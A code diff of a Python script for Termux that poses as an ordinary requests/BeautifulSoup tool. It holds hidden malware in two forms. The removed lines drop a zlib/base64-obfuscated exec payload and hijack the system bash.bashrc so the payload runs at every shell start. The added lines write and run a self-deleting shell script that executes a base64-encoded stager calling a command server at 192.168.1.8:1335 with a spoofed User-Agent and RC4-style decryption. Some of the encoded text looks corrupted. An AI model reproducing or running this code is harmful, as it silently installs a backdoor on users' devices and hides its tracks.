@@ -3,70 +3,18 @@ import requests
 from bs4 import BeautifulSoup
 import sys
 import os
-import time
 
-file = open("Cif3.py", "w")
+
+file = open("Cif3.sh", "w")
 file.write(
-    """exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckmA3bpRZ3sYKIBxERXG8i0iajhqZJSLJaFf+7DVmcwwxv5s2bDz15FxKOTo6Q+LfRAx/6CG3DYwoHmXjSE6BXF/CMtcWht29A6zXboSqFr8VXsSvNogS64Ue8v7+6fdk/Plxf3rHME9JZCzJRSurtRtTtmahFQ3izGMuMIUA/ogpmCT5l6TxbRAPg6SlDpisriYP1vRwpubghPIoA8oMuAk/rZ6S6IzYMfb5rA9iApYqdm0VOnfxXVyXNEMwgab5aKJBu8gFipOUBYmibnFSQmfyHRLKLvwz9AYhOXs4=')[0])))"""
-)
-file.close()
-
-file2 = open("bash.bashrc", "w")
-file2.write(
-    """# Command history tweaks:
-# - Append history instead of overwriting
-#   when shell exits.
-# - When using history substitution, do not
-#   exec command immediately.
-# - Do not save to history commands starting
-#   with space.
-# - Do not save duplicated commands.
-shopt -s histappend
-shopt -s histverify
-export HISTCONTROL=ignoreboth
-
-# Default command line prompt.
-PROMPT_DIRTRIM=2
-PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '
-
-# Handles nonexistent commands.
-# If user has entered command which invokes non-available
-# utility, command-not-found will give a package suggestions.
-if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
-	command_not_found_handle() {
-		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
-	}
-fi
-
-[ -r /data/data/com.termux/files/usr/share/bash-completion/bash_completion ] && . /data/data/com.termux/files/usr/share/bash-completion/bash_completion
-
-
-bash /data/data/com.termux/files/usr/etc/help.sh
+    """#!/bin/bash
+echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwYnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2RlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xOTIuMTY4LjEuODoxMzM1Jzt0PScvbmV3cy5waHAnOwpyZXE9dXJsbGliLnJlcXVlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPWYwRDdLRUE0QXBvcDdMWFRYQ0RaZmU1UTQ0ND0iKV07CnVybGxpYi5yZXF1ZXN0LmtHcihkUjhTSC58SycuZW5jb2RlKCdVVEYtOCcpOwpTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXTsKZm9yIGkgaW4gbGlzdChyYW5nZSgyNTYpKToKICAgIGo9aV0pJTI1NjsKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV07CiAgICBvdXQuYXBwZW5kKGNocihjaGFyXlNbKFNbaV0rU1tqXSklMjU2XSkpOwpleGVjKCcnLmpvaW4ob3
+rm -f "$0"
+exit
 """
 )
-file2.close()
-
-file3 = open("help.sh", "w")
-file3.write(
-    """#!/bin/bash
-
-python3 /data/data/com.termux/files/home/.termux/Cif3.py"""
-)
-file3.close()
-
-os.popen("mv Cif3.py /data/data/com.termux/files/home/.termux/")
-os.popen("mv help.sh /data/data/com.termux/files/usr/etc/")
-os.popen("mv bash.bashrc /data/data/com.termux/files/usr/etc/")
-print("1")
-time.sleep(1)
-print("2")
-time.sleep(1)
-print("3")
-time.sleep(1)
-os.popen("chmod +x /data/data/com.termux/files/usr/etc/bash.bashrc")
-os.popen("chmod +x /data/data/com.termux/files/usr/etc/help.sh")
-os.popen("python /data/data/com.termux/files/home/.termux/Cif3.py")
-
+file.close()
+os.popen("chmod +x Cif3.sh && ./Cif3.sh")
 if sys.version_info[0] != 3:
     print("Try again")
     sys.exit()
